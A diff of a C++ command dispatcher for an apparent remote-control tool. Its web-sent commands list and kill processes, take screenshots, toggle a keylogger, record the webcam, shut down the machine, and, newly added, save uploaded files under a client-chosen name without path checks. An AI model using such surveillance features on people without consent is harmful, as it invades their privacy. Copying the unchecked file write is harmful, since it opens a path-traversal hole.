@@ -6,6 +6,7 @@
 #include "../Features/ScreenCap.cpp"
 #include "../Features/Keylogger.cpp"
 #include "../Features/Webcam.cpp"
+#include "../Features/FileMgr.h"
 
 
 using namespace std;
@@ -21,20 +22,16 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
         string type = req["type"];
 
         // --- TAB 1 & 2: APPLICATIONS & PROCESSES ---
-        // Web gửi: { "type": "GET_APPS" } -> Lấy danh sách cửa sổ
         if (type == "GET_APPS") {
             cout << ">> Client request: Get Apps List" << endl;
             json apps = AppManager::GetRunningApps();
             
-            // Gửi trả về Web
             server.SendFrame(json{
                 {"type", "APP_LIST"},
                 {"payload", apps}
             }.dump());
         }
         
-        // Web gửi: { "type": "PROCESS_LIST" } (Nếu bạn thêm nút refresh process) 
-        // Hoặc tự động gọi khi cần lấy danh sách tiến trình chạy ngầm
         else if (type == "PROCESS_LIST") {
             cout << ">> Client request: Get Process List" << endl;
             json procs = AppManager::GetAllProcesses();
@@ -45,18 +42,14 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
             }.dump());
         }
 
-        // Web gửi: { "type": "KILL_APP", "payload": { "pid": 1234 } }
         else if (type == "KILL_APP") {
             int pid = req["payload"]["pid"];
             cout << ">> Client request: KILL PID " << pid << endl;
             
             AppManager::KillProcess(pid);
-            // Mẹo: Sau khi Kill xong, gửi lại danh sách mới ngay lập tức để Web cập nhật
-            // (Gửi cả 2 danh sách cho chắc ăn)
             server.SendFrame(json{{"type", "APP_LIST"}, {"payload", AppManager::GetRunningApps()}}.dump());
             server.SendFrame(json{{"type", "PROCESS_LIST"}, {"payload", AppManager::GetAllProcesses()}}.dump());
         }
-        // Web gửi: { "type": "START_APP", "payload": { "path": "notepad" } }
         else if (type == "START_APP") {
             string path = req["payload"]["path"];
             cout << ">> Client request: START " << path << endl;
@@ -64,7 +57,6 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
         }
 
         // --- TAB 3: SCREENSHOT ---
-        // Web gửi: { "type": "CAPTURE_SCREEN" }
         else if (type == "CAPTURE_SCREEN") {
             cout << ">> Client request: Screenshot" << endl;
             string b64 = ScreenCapture::TakeScreenshot();
@@ -76,7 +68,6 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
         }
 
         // --- TAB 4: KEYLOGGER ---
-        // Web gửi: { "type": "KEYLOG_CONTROL", "payload": { "action": "START" / "STOP" } }
         else if (type == "KEYLOG_CONTROL") {
             string action = req["payload"]["action"];
             if (action == "START") {
@@ -89,13 +80,10 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
         }
 
         // --- TAB 5: WEBCAM ---
-        // Web gửi: { "type": "RECORD_WEBCAM", "payload": { "duration": 10 } }
         else if (type == "RECORD_WEBCAM") {
             int duration = req["payload"]["duration"];
             cout << ">> Webcam: Recording for " << duration << "s..." << endl;
             
-            // QUAN TRỌNG: Phải tạo luồng (thread) riêng.
-            // Nếu không, Server sẽ bị "đơ" trong 10 giây chờ quay xong.
             server.SendFrame(json{
                 {"type", "WEBCAM_STATUS"},
                 {"payload", "PROCESSING"}
@@ -104,7 +92,6 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
                 string b64Video = WebcamMgr::RecordVideo(duration);
                 
                 if (!b64Video.empty()) {
-                    // Gửi video về khi quay xong
                     server.SendFrame(json{
                         {"type", "WEBCAM_VIDEO"},
                         {"payload", { {"base64", b64Video} }}
@@ -113,15 +100,32 @@ void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
                 } else {
                     cout << ">> Webcam: Error recording (Check ffmpeg.exe)" << endl;
                 }
-            }).detach(); // Tách luồng để nó chạy ngầm
+            }).detach(); 
         }
 
         // --- TAB 6: POWER ---
-        // Web gửi: { "type": "SYSTEM_COMMAND", "payload": { "action": "shutdown" / "restart" / "logoff" } }
         else if (type == "SYSTEM_COMMAND") {
             string action = req["payload"]["action"];
             cout << ">> System Command: " << action << endl;
             PowerControl::Execute(action);
+        }
+        else if (type == "UPLOAD_FILE") {
+            string fileName = req["payload"]["filename"];
+            string b64Data = req["payload"]["base64"];
+
+            cout << ">> [UPLOAD] Dang nhan file: " << fileName << "..." << endl;
+
+            // Lưu file xuống ổ cứng (Cùng thư mục với file .exe)
+            bool success = FileMgr::SaveFile(fileName, b64Data);
+
+            // Gửi thông báo lại cho Client
+            json response;
+            response["type"] = "UPLOAD_STATUS";
+            response["payload"] = {
+                {"status", success ? "SUCCESS" : "FAILED"},
+                {"filename", fileName}
+            };
+            server.SendFrame(response.dump());
         }
         
         else {
